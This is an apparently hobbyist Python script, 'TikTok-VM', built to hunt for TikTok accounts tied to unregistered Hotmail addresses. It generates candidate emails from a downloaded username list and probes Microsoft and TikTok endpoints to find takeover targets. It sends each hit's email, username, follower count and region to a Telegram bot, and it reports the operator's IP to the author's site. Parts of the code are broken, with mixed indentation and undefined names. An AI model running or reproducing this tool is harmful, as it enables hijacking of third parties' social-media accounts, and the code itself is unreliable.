#usr/env/bin
# -*- coding: utf-8 -*-
#script by : @os74o

try:
	import os,requests,random,user_agent,telebot,urllib,re
	
except:
	os.system('pip install -r https://github.com/OS74O/TikTok-VM-v1/blob/main/requirements.txt&&clear ')
	
from requests import (post,get)
from telebot import TeleBot
from random import (choice,randint)
from user_agent import generate_user_agent
from urllib.parse import urlencode
from re import findall
from ipaddress import ip_address, IPv4Address

#colors=[]
R="\033[1;31m"# Red
G="\033[1;32m" # Green
Y="\033[1;33m"# Yellow
B="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
h=R

os74 = f'''{h}
{W} .d88888b.   .d8888b.  
{h}d88P" "Y88b d88P  Y88b 
{W}888     888 Y88b.      
{h}888     888  "Y888b.   
{W}888     888     "Y88b. 
{h}888     888       "888 
{W}Y88b. .d88P Y88b  d88P 
{h} "Y88888P"   "Y8888P"           
  
                                         
{W}[ {h}TIKTOK-VM v1{W} ]
{W}--------------------------
{W}|{W}[ {h}Author {W}] : {h}@OS74O{W}     |
|{W}[ {h}Tele {W}] : {h}@OS74_Tools{W}  |
|{W}[{h} YT{W} ]   : {h} @OSAMA74{W}    |
{W}--------------------------
'''
print             ((((((((((((os74))))))))))))
print()
token = input(h+f' [{W}Token{h}] =>{W} ')
print()
ID = input(h+f' [{W}ID{h}] => {W}')
print("")
bot = telebot.TeleBot(token)
os.system('clear')
print(os74)
print("")
print(G+'~ Wait while the tool requirements completed... ')

#--get vpn ip statics--#

ip_url = "http://api.ipify.org"
response = get(ip_url).text
ip = IPv4Address(response)
user_ip = ip.compressed
url = f"https://dev-osama74.pantheonsite.io/api/IP-INFO/?ip={user_ip}"
h={'User-Agent':generate_user_agent()}
u = get(url,headers=h)
cc=u.json()['country_code']
try:
	lg=u['location']['languages'][0]['code']
	os.system('clear')
	print(os74)
except:
	lg='en'
	os.system('clear')
	print(os74)
#----------------------#
def info(email,tar):
		email=str(email)
		tar=str(email.split('@')[0])
		headers = {"user-agent": generate_user_agent()}
		r = get(f"https://www.tiktok.com/@{user}", headers=headers).text
		try:
			fw=r.split('"followerCount":')[1].split(',')[0]
			di=r.split('"id":"')[1].split('"')[0]
			fi=r.split('"followingCount":')[1].split(',')[0]
			reg=r.split('"region":"')[1].split('"')[0]
			print(W+f'[{G}GOOD Tiktok{W}]  {G}{email}'+W)
			oss=(f"""
╔━━━━━𝐓𝐈𝐊𝐓𝐎𝐊 𝐕𝐌━━━━╗ 
 ⌯ 𝐞𝐦𝐚𝐢𝐥 : {email} 
 ⌯ 𝐮𝐬𝐞𝐫 :<code>{tar}</code>
 ⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {fw} 
 ⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {fi} 
 ⌯ 𝐢𝐝 : {di} 
 ⌯ 𝐫𝐞𝐠𝐢𝐨𝐧 : {reg}
 ⌯ 𝐥𝐢𝐧𝐤 : <a href='https://www.tiktok.com/@{tar}'> Press </a>
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
			bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
			open('tiktok-vm.txt','a+').write(f'{email}\n')
			
			
		except:
			oss=(f"""
╔━━━━━𝐓𝐈𝐊𝐓𝐎𝐊 𝐕𝐌━━━━╗ 
 ⌯ 𝐞𝐦𝐚𝐢𝐥 : <code>{email}</code>
 ⌯ 𝐮𝐬𝐞𝐫 :<code>{tar}</code>
 ⌯ 𝐥𝐢𝐧𝐤 : <a href='https://www.tiktok.com/@{tar}'> Press </a>
╚━━━━━━━━━━━━━━━╝
 ⌯ 𝐣𝐨𝐢𝐧 : @OS74_TOOLS
""")
			bot.send_message(ID,f'<strong>{oss}</strong>',parse_mode='html')
			open('tiktok-vm.txt','a+').write(f'{email}\n')
			
	
def tk(email,tar):
			email=str(email)
			tar=str(email.split('@')[0])
			url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
			data = {"email": email, "aid": 1459, "language": lg, "account_sdk_source": "web", "region": cc}
			data_str = urlencode(data, safe='&')
			headers = {"User-Agent": generate_user_agent()}
			res = post(url, data=data_str, headers=headers)
			try:
				code=res.text
        if '''{"data":{"is_registered":0},"message":"success"}''' in code: 
          print(W+f'[{R}BAD Tiktok{W}]  {R}{email}'+W)
				if '''{"data":{"is_registered":1},"message":"success"}''' in code:
					info(email,tar)
				if  'Maximum number of attempts reached. Try again later.' in code:
					exit('\n\n[×] Change Your Vpn ❌ ') 
			except:
				exit('\n\n[×] Change Your Vpn ❌ ')

			
def hom(email,tar):
	email=str(email)
	tar=str(tar)
	headers2= {"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": generate_user_agent(),
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
	d2=None
	url2="https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" +str(email)+ "&_=1604288577990"
	res = post(url2, data=d2, headers=headers2).text
	if res=='Neither':
				
				print(W+f'[{Y}VM{W}]  {Y}{email}'+W)
				open('hotmail-vm.txt','a').write(f'{email}\n')
				tk(email,tar)
	else:
		print(W+f'[{R}BAD mail{W}]  {R}{email}'+W)
		
def combo(file_path):
	with open(file_path) as f:
	   lines = f.read().splitlines()
	   random_numbers = [random.randint(1,500000) for i in range(400)]
	   random_lines = [lines[number-1] for number in random_numbers]
	   while True:
	   		for tar in random_lines:
	   			dom=('@hotmail.com')
	   			email=f'{tar}{dom}'.lower()
		   		hom(email,tar)
										
def ChkPath(file_path):
	if os.path.isfile(file_path):
	    combo('new-users2.txt')
	    pass
	else:
	 	url = 'https://raw.githubusercontent.com/OS74O/TikTok-VM-v1/main/new-users2.txt'
	 	response = requests.get(url)
	 	with open(file_path, 'wb') as f:
	 		f.write(response.content)
	 		combo(file_path)
	 		pass
ChkPath('new-users2.txt')
combo('new-users2.txt')			

# instagram : @os.7.4
# telegram : @OS74_Tools
